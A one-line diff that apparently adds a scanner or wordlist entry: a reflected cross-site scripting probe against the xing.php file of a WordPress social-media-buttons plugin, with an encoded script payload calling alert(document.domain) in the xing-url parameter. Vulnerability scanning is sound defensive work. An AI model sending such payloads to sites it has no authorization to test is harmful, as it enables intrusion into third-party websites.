@@ -1,0 +1,1 @@
+/wp-content/plugins/2-click-socialmedia-buttons/libs/xing.php?xing-url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
